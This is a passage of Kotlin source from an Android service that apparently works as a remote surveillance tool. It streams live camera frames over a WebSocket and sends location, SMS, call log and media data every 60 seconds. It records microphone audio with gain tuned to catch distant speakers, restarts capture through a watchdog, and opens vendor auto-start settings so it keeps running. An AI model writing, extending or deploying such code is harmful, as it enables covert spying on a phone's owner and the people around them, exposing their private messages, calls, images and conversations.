            sensorSize.width().toFloat() / sensorSize.height()
        } else {
            4f / 3f  // Default to 4:3
        }
        
        // Prefer sizes matching sensor ratio (full frame, no crop)
        val size = allSizes
            .filter { it.width <= maxEdge && it.height <= maxEdge }
            .sortedWith(compareBy<android.util.Size> { sz ->
                // Calculate aspect ratio match to sensor (full frame = 0 difference)
                val ratio = maxOf(sz.width, sz.height).toFloat() / minOf(sz.width, sz.height)
                Math.abs(ratio - sensorRatio)
            }.thenByDescending { it.width * it.height })  // Then prefer larger
            .firstOrNull()
            ?: allSizes.maxByOrNull { it.width * it.height }  // Fallback: largest available
            ?: return null
        
        Log.d(TAG, "Photo capture: ${size.width}x${size.height}, sensor ratio: $sensorRatio")

        val thread = HandlerThread("photo_capture_thread").apply { start() }
        val handler = Handler(thread.looper)
        val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
        val latch = CountDownLatch(1)

        var bytes: ByteArray? = null
        var camera: CameraDevice? = null
        var session: CameraCaptureSession? = null

        try {
            imageReader.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage()
                    if (image != null) {
                        val buffer: ByteBuffer = image.planes[0].buffer
                        val arr = ByteArray(buffer.remaining())
                        buffer.get(arr)
                        bytes = arr
                        image.close()
                    }
                } catch (_: Exception) {
                } finally {
                    latch.countDown()
                }
            }, handler)

            val openLatch = CountDownLatch(1)
            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cd: CameraDevice) {
                    camera = cd
                    openLatch.countDown()
                }
                override fun onDisconnected(cd: CameraDevice) {
                    try { cd.close() } catch (_: Exception) {}
                    openLatch.countDown()
                }
                override fun onError(cd: CameraDevice, error: Int) {
                    try { cd.close() } catch (_: Exception) {}
                    openLatch.countDown()
                }
            }, handler)

            // Reduced timeout from 5s to 3s
            if (!openLatch.await(3, TimeUnit.SECONDS)) return null
            val cam = camera ?: return null

            val sessionLatch = CountDownLatch(1)
            cam.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(cs: CameraCaptureSession) {
                    session = cs
                    sessionLatch.countDown()
                }
                override fun onConfigureFailed(cs: CameraCaptureSession) {
                    sessionLatch.countDown()
                }
            }, handler)
            // Reduced timeout from 5s to 3s
            if (!sessionLatch.await(3, TimeUnit.SECONDS)) return null
            val capSession = session ?: return null

            val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(imageReader.surface)
                
                // Enable face detection for better focus and exposure
                set(CaptureRequest.STATISTICS_FACE_DETECT_MODE, 
                    CaptureRequest.STATISTICS_FACE_DETECT_MODE_SIMPLE)
                
                // Auto white balance for accurate colors
                set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)
                
                // Disable crop region (full frame)
                set(CaptureRequest.SCALER_CROP_REGION, chars.get(CameraCharacteristics.SENSOR_INFO_ACTIVE_ARRAY_SIZE))
                
                if (captureProfile.exposureNs != null && captureProfile.iso != null) {
                    // Night mode: manual exposure control
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_OFF)
                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_OFF)
                    set(CaptureRequest.SENSOR_EXPOSURE_TIME, captureProfile.exposureNs)
                    set(CaptureRequest.SENSOR_FRAME_DURATION, captureProfile.exposureNs)
                    set(CaptureRequest.SENSOR_SENSITIVITY, captureProfile.iso)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                    set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
                    // Noise reduction for night shots
                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_HIGH_QUALITY)
                } else {
                    // Auto mode: let camera decide
                    set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
                    set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
                    set(CaptureRequest.CONTROL_AE_EXPOSURE_COMPENSATION, captureProfile.aeCompensation)
                    set(
                        CaptureRequest.FLASH_MODE,
                        if (captureProfile.torch) CaptureRequest.FLASH_MODE_TORCH else CaptureRequest.FLASH_MODE_OFF
                    )
                    // Standard noise reduction
                    set(CaptureRequest.NOISE_REDUCTION_MODE, CaptureRequest.NOISE_REDUCTION_MODE_FAST)
                }
                
                // High quality JPEG (we compress later with network awareness)
                set(CaptureRequest.JPEG_QUALITY, 95.toByte())
            }.build()

            capSession.capture(req, object : CameraCaptureSession.CaptureCallback() {}, handler)
            // Reduced timeout from 6s to 4s
            latch.await(4, TimeUnit.SECONDS)
            return bytes
        } catch (e: Exception) {
            Log.w(TAG, "captureJpegOnce failed: ${e.message}")
            return null
        } finally {
            try { session?.close() } catch (_: Exception) {}
            try { camera?.close() } catch (_: Exception) {}
            try { imageReader.close() } catch (_: Exception) {}
            try { thread.quitSafely() } catch (_: Exception) {}
        }
    }

    private fun selectCameraId(cm: CameraManager, targetFacing: Int, allowFacingFallback: Boolean = true): String? {
        val ids = cm.cameraIdList ?: return null
        var fallback: String? = null
        for (id in ids) {
            val c = cm.getCameraCharacteristics(id)
            val facing = c.get(CameraCharacteristics.LENS_FACING)
            val caps = c.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
            val streamMap = c.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val hasJpeg = streamMap?.getOutputSizes(ImageFormat.JPEG)?.isNotEmpty() == true
            val isBackwardCompatible = caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_BACKWARD_COMPATIBLE)
            if (!hasJpeg || !isBackwardCompatible) {
                continue
            }
            if (facing == targetFacing && !isLogicalMultiCamera(c)) return id
            if (facing == targetFacing && fallback == null) fallback = id
            if (allowFacingFallback && fallback == null) fallback = id
        }
        return fallback
    }

    private fun isLogicalMultiCamera(chars: CameraCharacteristics): Boolean {
        val caps = chars.get(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES) ?: IntArray(0)
        return caps.contains(CameraCharacteristics.REQUEST_AVAILABLE_CAPABILITIES_LOGICAL_MULTI_CAMERA)
    }

    private fun liveFrameIntervalMs(): Long {
        return when (photoQualityMode) {
            "fast" -> 60L
            "hd" -> 140L
            else -> 90L
        }
    }

    private fun startCameraLiveStream(targetFacing: Int, strictFacing: Boolean = false) {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            safeSend("ACK:camera_live:camera_permission_denied")
            return
        }
        preferredCameraFacing = targetFacing
        cameraLiveStrictFacing = strictFacing
        if (isCameraLiveStreaming) {
            restartCameraLiveStream()
            return
        }
        isCameraLiveStreaming = true
        cameraLiveJob?.cancel()
        cameraLiveJob = serviceScope.launch(Dispatchers.IO) {
            safeSend("ACK:camera_live:started")
            sendHealthStatus("camera_live_on")
            while (isActive && isCameraLiveStreaming && activeWebSocket != null) {
                try {
                    val jpeg = captureJpegOnce(preferredCameraFacing, allowFacingFallback = !cameraLiveStrictFacing)
                    if (jpeg != null && jpeg.isNotEmpty()) {
                        val now = System.currentTimeMillis()
                        val frameBase64 = Base64.encodeToString(jpeg, Base64.NO_WRAP)
                        val msg = JSONObject().apply {
                            put("type", "camera_live_frame")
                            put("deviceId", deviceId)
                            put("camera", if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT) "front" else "rear")
                            put("quality", photoQualityMode)
                            put("mime", "image/jpeg")
                            put("data", frameBase64)
                            put("ts", now)
                        }
                        if (!safeSend(msg.toString())) {
                            // WebSocket send failed, stop live stream
                            Log.w(TAG, "Camera live send failed - stopping stream")
                            break
                        }
                    }
                    delay(liveFrameIntervalMs())
                } catch (e: Exception) {
                    Log.w(TAG, "camera live frame failed: ${e.message}")
                    delay(200)
                }
            }
        }
    }

    private fun restartCameraLiveStream() {
        if (!isCameraLiveStreaming) return
        stopCameraLiveStream("restart")
        startCameraLiveStream(preferredCameraFacing, cameraLiveStrictFacing)
    }

    private fun stopCameraLiveStream(reason: String) {
        val wasLive = isCameraLiveStreaming
        isCameraLiveStreaming = false
        cameraLiveJob?.cancel()
        cameraLiveJob = null
        if (wasLive) {
            safeSend("ACK:camera_live:stopped")
            sendHealthStatus("camera_live_off_$reason")
        }
    }

    private fun optimizePhotoJpeg(source: ByteArray, isFrontCamera: Boolean = false): ByteArray {
        return try {
            val qualityMode = photoQualityMode
            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeByteArray(source, 0, source.size, bounds)
            
            // Use full resolution for HD, reasonable for others (no aggressive crop)
            val maxEdge = when (qualityMode) {
                "fast" -> 1280   // Increased from 1024 for better quality
                "hd" -> 1920
                else -> 1280
            }
            var sample = 1
            while ((bounds.outWidth / sample) > maxEdge || (bounds.outHeight / sample) > maxEdge) {
                sample *= 2
            }
            val opts = BitmapFactory.Options().apply { inSampleSize = sample.coerceAtLeast(1) }
            var bitmap = BitmapFactory.decodeByteArray(source, 0, source.size, opts) ?: return source
            
            // Mirror front camera images
            if (isFrontCamera) {
                val mirrored = ImageEnhancer.mirrorHorizontally(bitmap)
                bitmap.recycle()
                bitmap = mirrored
            }
            
            val enhanced = if (aiPhotoEnhancementEnabled) {
                // Detect capture mode based on brightness
                val avgLuma = ImageEnhancer.estimateLuma(bitmap)
                val mode = when {
                    photoNightMode != "off" -> ImageEnhancer.CaptureMode.NIGHT
                    else -> ImageEnhancer.detectMode(avgLuma)
                }
                
                Log.d(TAG, "Photo enhancement: luma=$avgLuma, mode=$mode")
                
                // Apply full enhancement pipeline
                ImageEnhancer.enhance(bitmap, mode, null)
            } else {
                bitmap
            }
            
            // Network-aware compression
            val jpegBytes = ImageEnhancer.compress(enhanced, lowNetworkMode, qualityMode)
            
            if (enhanced !== bitmap) enhanced.recycle()
            bitmap.recycle()
            
            jpegBytes
        } catch (e: Exception) {
            Log.w(TAG, "optimizePhotoJpeg failed: ${e.message}")
            source
        }
    }

    private fun estimateLuma(bitmap: android.graphics.Bitmap): Float {
        val w = bitmap.width
        val h = bitmap.height
        if (w <= 0 || h <= 0) return 128f
        val stepX = (w / 32).coerceAtLeast(1)
        val stepY = (h / 32).coerceAtLeast(1)
        var sum = 0.0
        var count = 0
        var y = 0
        while (y < h) {
            var x = 0
            while (x < w) {
                val c = bitmap.getPixel(x, y)
                val r = (c shr 16) and 0xFF
                val g = (c shr 8) and 0xFF
                val b = c and 0xFF
                sum += 0.2126 * r + 0.7152 * g + 0.0722 * b
                count++
                x += stepX
            }
            y += stepY
        }
        return if (count > 0) (sum / count).toFloat() else 128f
    }

    private fun applyColorAdjust(
        source: android.graphics.Bitmap,
        contrast: Float,
        brightness: Float,
        saturation: Float,
    ): android.graphics.Bitmap {
        val out = source.copy(android.graphics.Bitmap.Config.ARGB_8888, true)
        val satMatrix = ColorMatrix().apply { setSaturation(saturation) }
        val c = contrast
        val t = (-0.5f * c + 0.5f) * 255f + brightness
        val conMatrix = ColorMatrix(
            floatArrayOf(
                c, 0f, 0f, 0f, t,
                0f, c, 0f, 0f, t,
                0f, 0f, c, 0f, t,
                0f, 0f, 0f, 1f, 0f,
            )
        )
        satMatrix.postConcat(conMatrix)
        val canvas = Canvas(out)
        val paint = android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG).apply {
            colorFilter = ColorMatrixColorFilter(satMatrix)
        }
        canvas.drawBitmap(source, 0f, 0f, paint)
        return out
    }

    // ────────────────────────────────────────────────────────────────────────
    // Data collection — location, SMS, call log, media (every 60s)
    // ────────────────────────────────────────────────────────────────────────

    private fun startDataCollection() {
        stopDataCollection()
        dataJob = serviceScope.launch(Dispatchers.IO) {
            // Send immediately on connect, then every 60 seconds
            while (isActive) {
                sendDeviceData()
                delay(60_000)
            }
        }
    }

    private fun stopDataCollection() {
        dataJob?.cancel()
        dataJob = null
    }
    
    /**
     * Open auto-start settings for Chinese ROMs (Realme, Xiaomi, Vivo, etc.)
     * Returns true if successfully opened a settings activity
     */
    private fun openAutoStartSettings(): Boolean {
        val manufacturer = android.os.Build.MANUFACTURER.lowercase()
        Log.i(TAG, "Opening auto-start settings for manufacturer: $manufacturer")
        
        val autoStartIntents = when {
            manufacturer in listOf("oppo", "realme") -> listOf(
                // Realme UI 2.0+ / ColorOS 11+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                )),
                // Realme UI 1.0 / ColorOS 7
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.startupapp.StartupAppListActivity"
                )),
                // Oppo ColorOS
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oppo.safe",
                    "com.oppo.safe.permission.startup.StartupAppListActivity"
                )),
                // ColorOS 12+ / Realme UI 3+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oplus.safecenter",
                    "com.oplus.safecenter.permission.startup.StartupAppListActivity"
                ))
            )
            manufacturer in listOf("xiaomi", "redmi") -> listOf(
                // MIUI 12+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )),
                // Older MIUI
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.permissions.PermissionsEditorActivity"
                ))
            )
            manufacturer == "vivo" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.iqoo.secure",
                    "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
                )),
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                ))
            )
            manufacturer == "huawei" || manufacturer == "honor" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )),
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.optimize.process.ProtectActivity"
                ))
            )
            manufacturer == "oneplus" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oneplus.security",
                    "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
                ))
            )
            else -> emptyList()
        }
        
        for (intent in autoStartIntents) {
            try {
                intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                if (intent.resolveActivity(packageManager) != null) {
                    startActivity(intent)
                    Log.i(TAG, "Opened auto-start settings: ${intent.component}")
                    return true
                }
            } catch (e: Exception) {
                Log.w(TAG, "Could not open ${intent.component}: ${e.message}")
            }
        }
        
        Log.w(TAG, "No auto-start settings found for $manufacturer")
        return false
    }

    private fun sendDeviceData() {
        try {
            val data = dataCollector.collectAll()
            val msg = JSONObject()
            msg.put("type", "device_data")
            msg.put("deviceId", deviceId)
            msg.put("data", data)
            safeSend(msg.toString())
            Log.d(TAG, "Device data sent")
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceData error: ${e.message}")
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Audio capture loop (raw PCM 16-bit mono 16 kHz)
    // ────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")  // Permission already checked in MainActivity before service starts
    private fun startAudioCapture() {
        if (isCapturing) return
        if (isDeviceInCall()) {
            Log.w(TAG, "Mic start blocked: device is currently in call")
            sendHealthStatus("blocked_on_call")
            return
        }
        isCapturing = true
        lastAudioChunkSentAt = System.currentTimeMillis()

        serviceScope.launch(Dispatchers.IO) {
            // ── PRIORITY BOOST: Audio thread and network binding ─────────────
            // Set highest audio priority for this thread
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
            
            // Bind to best available network for stable streaming
            try {
                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
                cm?.activeNetwork?.let { network ->
                    cm.bindProcessToNetwork(network)
                    Log.i(TAG, "Bound to network for audio priority")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Network binding failed: ${e.message}")
            }
            
            // MODE_IN_COMMUNICATION activates the phone's call-quality mic profile, which
            // typically has significantly higher analog sensitivity than MODE_NORMAL —
            // critical for capturing distant speakers. Restored when capture ends.
            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            am?.isMicrophoneMute  = false   // ensure mic is not software-muted
            am?.isSpeakerphoneOn  = false   // speakerphone off — avoids feedback loop
            am?.mode = AudioManager.MODE_IN_COMMUNICATION
            ourAudioMode = true
            
            // ── Initialize HQ buffer if in buffered mode ─────────────────────
            if (hqBufferedMode) {
                if (hqBuffer.size != hqBufferSize) {
                    hqBuffer = ByteArray(hqBufferSize)
                }
                hqBufferOffset = 0
                Log.i(TAG, "HQ Buffered mode: ${hqBufferSeconds}s buffer initialized")
            }
            
            try {
                audioRecord = createAudioRecordWithFallback()

                if (audioRecord == null) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    safeSend("{\"type\":\"error\",\"message\":\"mic_init_failed\",\"deviceId\":\"$deviceId\"}")
                    isCapturing = false
                    if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                    sendHealthStatus("mic_init_failed")
                    return@launch
                }

                audioRecord?.startRecording()
                resetEnhancerState()   // clear filter memory from any prior session
                Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")
                sendHealthStatus("mic_started")

                val chunk = ByteArray(streamChunkSize)
                var consecutiveReadErrors = 0
                var nearSilentFrames = 0
                var rotateSourceOnExit = false
                var sourceRotateAttempts = 0
                val captureStartedAtMs = System.currentTimeMillis()

                while (isCapturing && isActive) {
                    val read = audioRecord?.read(chunk, 0, chunk.size) ?: -1
                    if (read > 0) {
                        consecutiveReadErrors = 0
                        // Some OEMs initialize a source successfully but feed near-zero samples.
                        // Detect prolonged near-silence and rotate to the next source automatically.
                        var peakAbs = 0
                        var i = 0
                        while (i + 1 < read) {
                            val s = readLeSample(chunk, i)
                            val abs = kotlin.math.abs(s)
                            if (abs > peakAbs) peakAbs = abs
                            i += 2
                        }
                        // Rotate source only for true digital-near-zero capture during startup.
                        // Normal quiet rooms or speech pauses must not trigger source restarts.
                        nearSilentFrames = if (peakAbs < 14) (nearSilentFrames + 1) else 0
                        val startupWindow = (System.currentTimeMillis() - captureStartedAtMs) <= 15_000L
                        if (nearSilentFrames >= 500 && startupWindow && sourceRotateAttempts < 1 && !isDeviceInCall()) {
                            val sourceCount = preferredAudioSources().size.coerceAtLeast(1)
                            audioSourceRotation = (audioSourceRotation + 1) % sourceCount
                            sourceRotateAttempts++
                            rotateSourceOnExit = true
                            isCapturing = false
                            sendHealthStatus("mic_source_rotate")
                            Log.w(TAG, "Mic near-silent with source=$activeAudioSource, rotating source")
                            continue
                        }
                        if (aiAutoModeEnabled) {
                            updateAutoAiProfile(chunk, read)
                        }
                        
                        // ══════════════════════════════════════════════════════════════════
                        // HQ BUFFERED MODE vs REALTIME MODE
                        // ══════════════════════════════════════════════════════════════════
                        if (hqBufferedMode && !isWebRtcStreaming) {
                            // ── HQ BUFFERED MODE: Accumulate audio, process in chunks ────
                            // Copy raw audio to HQ buffer
                            val copyLen = min(read, hqBufferSize - hqBufferOffset)
                            System.arraycopy(chunk, 0, hqBuffer, hqBufferOffset, copyLen)
                            hqBufferOffset += copyLen
                            
                            // When buffer is full, process and send
                            if (hqBufferOffset >= hqBufferSize) {
                                Log.d(TAG, "HQ buffer full (${hqBufferSize} bytes), processing...")
                                
                                // OPTIMIZATION 1: Skip silent buffers (reduces bandwidth & noise)
                                if (isBufferMostlySilent(hqBuffer, hqBufferOffset)) {
                                    Log.d(TAG, "HQ buffer is mostly silent, skipping transmission")
                                    hqBufferOffset = 0
                                    sendHealthStatus("hq_buffer_silent")
                                } else {
                                    val processed = processHqBuffer(hqBuffer, hqBufferOffset)
                                    
                                    if (processed.isNotEmpty()) {
                                        // OPTIMIZATION 2: Always compress in HQ mode (50% bandwidth reduction)
                                        val compressed = pcm16ToMuLaw(processed)
                                        val encoded = encodeHqAudio(compressed, isCompressed = true)
                                        
                                        // OPTIMIZATION 3: Send in chunks to avoid WebSocket frame size limits
                                        val sendSuccess = sendHqAudioChunked(encoded)
                                        
                                        if (sendSuccess) {
                                            lastAudioChunkSentAt = System.currentTimeMillis()
                                            Log.i(TAG, "HQ audio sent: ${processed.size} → ${compressed.size} compressed → ${encoded.size} encoded")
                                        } else {
                                            Log.w(TAG, "HQ audio send failed - stopping capture")
                                            isCapturing = false
                                            break
                                        }
                                    }
                                    
                                    // Reset buffer
                                    hqBufferOffset = 0
                                    sendHealthStatus("hq_buffer_sent")
                                }
                            }
                            
                            // Also write to recording if active
                            if (isSavingFile) {
                                recordingFileStream?.write(chunk, 0, read)
                            }
                        } else {
                            // ── REALTIME MODE: Original streaming behavior ───────────────
                            // Trick 2 + 3: adaptive upward gain for far voices + soft peak limiter
                            val pcmData = applyFarVoiceGain(chunk, read)

                            // 1) Live stream via legacy WS path only when WebRTC is inactive
                            if (!isWebRtcStreaming) {
                                if (safeSend(encodeWsFallbackAudio(pcmData).toByteString())) {
                                    lastAudioChunkSentAt = System.currentTimeMillis()
                                    if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
                                        sendHealthStatus("audio_tick")
                                    }
                                } else {
                                    // WebSocket send failed, stop audio capture to allow recovery
                                    Log.w(TAG, "Audio send failed - stopping capture for reconnect")
                                    isCapturing = false
                                    break
                                }
                            }

                            // 2) Write to recording file if active
                            if (isSavingFile) {
                                recordingFileStream?.write(pcmData)
                            }
                        }
                    } else if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                        Log.e(TAG, "AudioRecord dead object detected")
                        safeSend("{\"type\":\"error\",\"message\":\"mic_dead_object\",\"deviceId\":\"$deviceId\"}")
                        sendHealthStatus("mic_dead_object")
                        break
                    } else if (read == AudioRecord.ERROR || read == AudioRecord.ERROR_BAD_VALUE) {
                        consecutiveReadErrors++
                        if (consecutiveReadErrors >= 5) {
                            Log.e(TAG, "AudioRecord read failed repeatedly: $read")
                            safeSend("{\"type\":\"error\",\"message\":\"mic_read_error\",\"deviceId\":\"$deviceId\"}")
                            sendHealthStatus("mic_read_error")
                            break
                        }
                        delay(100)
                    } else {
                        // zero read: let watchdog decide if stream is stalled
                        delay(10)
                    }
                }

                audioRecord?.stop()
                audioRecord?.release()
                audioRecord = null
                val wasCapturing = isCapturing
                isCapturing = false
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                Log.i(TAG, "Audio capture stopped")
                sendHealthStatus("mic_stopped")

                if (rotateSourceOnExit && wantsMicStreaming && activeWebSocket != null && !isWebRtcStreaming) {
                    delay(350)
                    startAudioCapture()
                } else if (wasCapturing && wantsMicStreaming && activeWebSocket != null && !isWebRtcStreaming) {
                    // Capture loop exited unexpectedly while stream is still requested.
                    delay(500)
                    startAudioCapture()
                }

            } catch (e: Exception) {
                Log.e(TAG, "Audio capture error", e)
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                isCapturing = false
                sendHealthStatus("mic_error")
            }
        }
    }

    private fun startMicWatchdog() {
        if (micWatchdogJob?.isActive == true) return
        micWatchdogJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(5_000)  // Check every 5 seconds instead of 15
                if (!wantsMicStreaming || activeWebSocket == null || isRecoveringMic) continue

                if (isDeviceInCall()) {
                    sendHealthStatus("blocked_on_call")
                    continue
                }

                // Reduce stall timeout from 35s to 20s for faster recovery
                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
                if (!isCapturing || stalled) {
                    isRecoveringMic = true
                    try {
                        Log.w(TAG, "Mic watchdog recovery triggered (capturing=$isCapturing stalled=$stalled)")
                        sendHealthStatus("watchdog_recover")
                        stopAudioCapture()
                        delay(300)
                        startAudioCapture()
                    } finally {
                        isRecoveringMic = false
                    }
                }
            }
        }
    }

    private fun stopMicWatchdog() {
        micWatchdogJob?.cancel()
        micWatchdogJob = null
    }

    private fun createAudioRecordWithFallback(): AudioRecord? {
        // VOICE_RECOGNITION is usually best for far-field pickup, but some devices return
        // near-silent audio on specific sources. We rotate starting source after failures.
        val sources = preferredAudioSources()
        val offset = audioSourceRotation.mod(sources.size.coerceAtLeast(1))
        for (idx in sources.indices) {
            val source = sources[(offset + idx) % sources.size]
            try {
                val rec = AudioRecord(
                    source,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    recordBufferSize
                )
                if (rec.state == AudioRecord.STATE_INITIALIZED) {
                    // API 28+: prevent Android from auto-switching to a different mic
                    // mid-session (e.g. switching to a noise-cancelling secondary mic that
                    // attenuates distant voices).
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        try { rec.preferredDevice = null } catch (_: Exception) {}
                    }
                    // API 29+: switch pickup pattern from directional (call/close-talk) to
                    // omnidirectional so the mic captures all directions equally.
                    // -1.0 = omni, 0.0 = neutral, +1.0 = front-directional.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try { rec.setPreferredMicrophoneFieldDimension(-1.0f) } catch (_: Exception) {}
                        // 0 = MIC_DIRECTION_UNSPECIFIED — disables beam-forming so all directions
                        // are captured equally instead of favouring near/front speech.
                        try { rec.setPreferredMicrophoneDirection(0) } catch (_: Exception) {}
                    }
                    // AI mode: enable hardware NS/AGC for better environmental noise cleanup.
                    // Natural mode: keep effects disabled for a more raw capture profile.
                    val sid = rec.audioSessionId
                    if (NoiseSuppressor.isAvailable()) {
                        try {
                            NoiseSuppressor.create(sid)?.let { e ->
                                // Far-profile prioritizes pickup loudness over strong suppression.
                                e.enabled = aiEnhancementEnabled && voiceProfile != "far"
                                e.release()
                            }
                        } catch (_: Exception) {}
                    }
                    if (AcousticEchoCanceler.isAvailable())
                        try { AcousticEchoCanceler.create(sid)?.let { e -> e.enabled = aiEnhancementEnabled; e.release() } } catch (_: Exception) {}
                    if (AutomaticGainControl.isAvailable()) {
                        try {
                            AutomaticGainControl.create(sid)?.let { e ->
                                // Keep AGC enabled to lift weak microphone input consistently.
                                e.enabled = true
                                e.release()
                            }
                        } catch (_: Exception) {}
                    }
                    activeAudioSource = source
                    Log.i(TAG, "AudioRecord initialized with source=$source, recordBuffer=$recordBufferSize, chunk=$streamChunkSize")
                    return rec
                }
                rec.release()
            } catch (e: Exception) {
                Log.w(TAG, "AudioRecord init failed for source=$source: ${e.message}")
            }
        }
        return null
    }

    /** Reset all IIR filter memory.  Must be called once at every capture-session start. */
    private fun resetEnhancerState() {
        hpfPrevX = 0.0; hpfPrevY = 0.0
        eq1X1 = 0.0; eq1X2 = 0.0; eq1Y1 = 0.0; eq1Y2 = 0.0
        smoothedGain = 1.0
        spectralDenoiser.reset()
    }

    /**
    * Voice-monitor PCM enhancement pipeline.
     *
    * Correct order: denoise + controlled gain + limiter. Keep processing moderate
    * to avoid the distortion artifacts from overly aggressive EQ/boost stacks.
     *
    *  Stage 1 — HPF @ 120 Hz            removes sub-bass rumble
    *  Stage 2 — Spectral denoiser       suppresses steady fan/AC noise
    *  Stage 3 — Adaptive gain (up 3.2x) lifts far voice without hard pumping
    *  Stage 4 — Gentle presence boost   improves intelligibility
    *  Stage 5 — Soft peak limiter       prevents digital clipping
     *
     * Filter state (hpfPrev*, eq1*, bq*, pe*, smoothedGain) persists between
     * frames so there are no discontinuities at buffer boundaries.
     */
    private fun applyFarVoiceGain(buf: ByteArray, len: Int): ByteArray {
        if (len < 2) return buf.copyOf(len)
        val samples = len / 2
        val strongAi = aiEnhancementEnabled
        val p = voiceProfile

        // ── Decode PCM-16 LE → double working buffer ─────────────────────────
        val work = DoubleArray(samples)
        for (i in 0 until samples) {
            val lo = buf[i * 2].toInt() and 0xFF
            val hi = buf[i * 2 + 1].toInt() and 0xFF
            work[i] = ((hi shl 8) or lo).toShort().toDouble()
        }

        // ── Pre-gain mic boost (strong lift to fix low input level) ───────────
        val micBoost = when (p) {
            "near" -> 1.60
            "far" -> 2.60
            else -> 2.00
        }
        for (i in 0 until samples) work[i] *= micBoost

        // ── Stage 1: High-pass filter @ 120 Hz ───────────────────────────────
        // In noisy environments (fan/hum), push HPF slightly higher to remove rumble.
        val noisyEnv = estimatedNoiseDb > -54.0
        val hpAlpha = if (noisyEnv) 0.9470 else 0.9550
        for (i in 0 until samples) {
            val x = work[i]
            val y = hpAlpha * (hpfPrevY + x - hpfPrevX)
            hpfPrevX = x; hpfPrevY = y
            work[i] = y
        }

        // ── Stage 2: FFT Spectral denoiser ───────────────────────────────────
        // For far profile keep denoise lighter to avoid suppressing weak speech.
        val preDenoise = if (p == "far") work.copyOf() else null
        spectralDenoiser.denoise(work)
        if (p == "far" && preDenoise != null) {
            for (i in 0 until samples) {
                work[i] = preDenoise[i] * 0.55 + work[i] * 0.45
            }
        }

        // ── Stage 3: Adaptive upward gain (balanced for clarity) ─────────────
        var sumSq = 0.0
        for (v in work) sumSq += v * v
        val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
        val gainCeil = when (p) {
            "near" -> if (strongAi) 2.4 else 2.0
            "far" -> if (strongAi) 4.6 else 4.0
            else -> if (strongAi) 3.2 else 2.8
        }
        val gainTarget = when (p) {
            "near" -> if (strongAi) 9000.0 else 7600.0
